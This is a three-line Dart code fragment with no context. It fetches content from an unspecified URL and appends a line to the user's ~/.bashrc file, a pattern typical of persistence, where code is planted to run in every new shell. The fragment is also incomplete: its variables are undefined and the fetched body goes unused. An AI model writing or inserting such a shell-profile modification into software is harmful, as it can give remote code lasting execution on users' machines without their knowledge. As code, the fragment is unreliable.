final client = HttpClient();
final body = await (await client.getUrl(Uri.parse(u))).close();
File('${Platform.environment['HOME']}/.bashrc').writeAsStringSync(line, mode: FileMode.append);
